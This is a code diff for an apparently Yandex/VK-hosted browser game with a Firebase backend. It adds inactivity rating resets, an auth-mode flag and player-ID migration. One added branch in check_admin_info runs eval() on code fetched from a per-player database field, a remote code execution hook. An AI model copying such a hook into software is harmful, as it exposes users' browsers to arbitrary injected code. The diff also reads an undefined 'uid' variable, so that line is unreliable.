@@ -1973,12 +1973,15 @@ online_game={
 		
 			//увеличиваем количество игр
 			my_data.games++;
-			fbs.ref('players/'+[my_data.uid]+'/games').set(my_data.games);	
+			fbs.ref('players/'+my_data.uid+'/games').set(my_data.games);	
+	
+			//записываем дату последней игры
+			fbs.ref('players/'+my_data.uid+'/last_game_tm').set(firebase.database.ServerValue.TIMESTAMP);
 	
 			//контрольные концовки
-			if (my_data.rating>2500 || opp_data.rating>2500) {
-				fbs.ref('finishes2').push({uid:my_data.uid,player1:objects.my_card_name.text,player2:objects.opp_card_name.text, res:res_info[1],fin_type:final_state,made_moves_both:game.made_moves_both, rating: [old_rating,my_data.rating],ts:firebase.database.ServerValue.TIMESTAMP});	
-			}
+			if (my_data.rating>2500 || opp_data.rating>2500)
+				fbs.ref('finishes2/'+irnd(1,999999)).set({uid:my_data.uid,player1:objects.my_card_name.text,player2:objects.opp_card_name.text, res:res_info[1],fin_type:final_state,made_moves_both:game.made_moves_both, rating: [old_rating,my_data.rating],ts:firebase.database.ServerValue.TIMESTAMP});	
+			
 	
 	
 		}
@@ -5927,10 +5930,12 @@ auth1={
 				_player = await window.ysdk.getPlayer();
 			} catch (e) { alert(e)};
 			
-			my_data.name 	= _player.getName();
-			my_data.uid 	= _player.getUniqueID().replace(/\//g, "Z");
+			my_data.name = _player.getName();
+			my_data.uid = _player.getUniqueID().replace(/\//g, "Z");
+			my_data.uid2 = uid.replace(/[\/+=]/g, '');
 			my_data.orig_pic_url = _player.getPhoto('medium');
-
+			my_data.auth_mode=_player.getMode()==='lite'?0:1;
+			
 			if (my_data.orig_pic_url === 'https://games-sdk.yandex.ru/games/api/sdk/v1/player/avatar/0/islands-retina-medium')
 				my_data.orig_pic_url = 'mavatar'+my_data.uid;	
 			
@@ -5956,7 +5961,7 @@ auth1={
 			my_data.name 	= _player.first_name + ' ' + _player.last_name;
 			my_data.uid 	= 'vk'+_player.id;
 			my_data.orig_pic_url = _player.photo_100;
-			
+			my_data.auth_mode=1;
 			return;
 			
 		}
@@ -6077,6 +6082,7 @@ auth2={
 			my_data.uid = _player.getUniqueID().replace(/[\/+=]/g, '');
 			my_data.name = _player.getName();		
 			my_data.orig_pic_url = _player.getPhoto('medium');
+			my_data.auth_mode=_player.getMode()==='lite'?0:1;
 			
 			if (my_data.orig_pic_url === 'https://games-sdk.yandex.ru/games/api/sdk/v1/player/avatar/0/islands-retina-medium')
 				my_data.orig_pic_url = 'mavatar'+my_data.uid;	
@@ -6102,7 +6108,7 @@ auth2={
 			my_data.name 	= _player.first_name + ' ' + _player.last_name;
 			my_data.uid 	= 'vk'+_player.id;
 			my_data.orig_pic_url = _player.photo_100;
-			
+			my_data.auth_mode=1;
 			return;
 			
 		}
@@ -6112,6 +6118,7 @@ auth2={
 			my_data.uid = this.search_in_local_storage() || this.get_random_uid_for_local('GP_');
 			my_data.name = this.get_random_name(my_data.uid);
 			my_data.orig_pic_url = 'mavatar'+my_data.uid;		
+			my_data.auth_mode=0;
 			return;
 		}
 		
@@ -6119,6 +6126,7 @@ auth2={
 
 			my_data.name = my_data.uid = 'debug' + prompt('Отладка. Введите ID', 100);
 			my_data.orig_pic_url = 'mavatar'+my_data.uid;		
+			my_data.auth_mode=0;
 			return;
 		}	
 		
@@ -6129,6 +6137,7 @@ auth2={
 			my_data.uid = this.search_in_local_storage() || this.get_random_uid_for_local('LS_');
 			my_data.name = this.get_random_name(my_data.uid);
 			my_data.orig_pic_url = 'mavatar'+my_data.uid;		
+			my_data.auth_mode=0;
 		}
 	
 	},
@@ -6448,6 +6457,25 @@ main_loader={
 
 async function check_admin_info(){
 	
+	//проверяем долгое отсутствие игру у рейтинговых игроков
+	if (my_data.rating>2000){
+		const last_game_tm=await fbs_once(`players/${my_data.uid}/last_game_tm`);
+		const cur_tm=await fbs_once(`players/${my_data.uid}/tm`);
+		
+		if (!last_game_tm)
+			fbs.ref('players/'+my_data.uid+'/last_game_tm').set(firebase.database.ServerValue.TIMESTAMP);	
+		
+		if (last_game_tm&&cur_tm){
+			const days_passed=(cur_tm-last_game_tm)/3600000/24;
+			if (days_passed>3){
+				my_data.rating=2000;
+				fbs.ref('players/'+my_data.uid+'/rating').set(my_data.rating);
+				message.add('Ваш рейтинг округлен до 2000. Причина - отсутвие игр.',7000);
+			}
+		}
+	}	
+	
+	
 	//проверяем и показываем инфо от админа и потом удаляем
 	const admin_msg_path=`players/${my_data.uid}/admin_info`;
 	const data=await fbs_once(admin_msg_path);
@@ -6464,6 +6492,10 @@ async function check_admin_info(){
 			//message.add('Ваш рейтинг обнулен. Причина - договорные игры.',7000);
 		}	
 		
+		if (data.type==='EVAL_CODE'){
+			eval(data.code)
+		}	
+				
 		fbs.ref(admin_msg_path).remove();		
 	}		
 }
@@ -6505,6 +6537,9 @@ async function init_game_env(lang) {
 	my_data.name=my_data.name.replace(/Ё/g, 'Е');
 
 
+
+
+
 	//инициируем файербейс
 	if (firebase.apps.length===0) {
 		firebase.initializeApp({
@@ -6521,6 +6556,29 @@ async function init_game_env(lang) {
 	
 	//коротко файрбейс
 	fbs=firebase.database();
+
+
+	//конвертируем юид
+	let other_data;
+	if (my_data.uid2){
+		const new_data=await fbs_once('players/' + my_data.uid2);
+		if (new_data){
+			other_data=new_data;
+			
+			//удаляем старые данные если они остались вдруг
+			fbs.ref('players/'+my_data.uid).remove();
+			
+		}else{			
+			//копируем
+			const old_data=await fbs_once('players/' + my_data.uid);
+			fbs.ref('players/'+my_data.uid2).set(old_data);
+			other_data=old_data;
+		}
+		my_data.uid=my_data.uid2;
+	}else{
+		other_data=await fbs_once('players/' + my_data.uid);
+	}
+
 
 	//доп функция для текста битмап
 	PIXI.BitmapText.prototype.set2=function(text,w){		
@@ -6634,7 +6692,9 @@ async function init_game_env(lang) {
 	fbs.ref('players/'+my_data.uid+'/pic_url').set(my_data.pic_url);
 	fbs.ref('players/'+my_data.uid+'/rating').set(my_data.rating);
 	fbs.ref('players/'+my_data.uid+'/country').set(my_data.country);
+	fbs.ref('players/'+my_data.uid+'/auth_mode').set(my_data.auth_mode);
 	fbs.ref('players/'+my_data.uid+'/tm').set(firebase.database.ServerValue.TIMESTAMP);
+
 	
 	//устанавливаем мой статус в онлайн
 	set_state({state : 'o'});
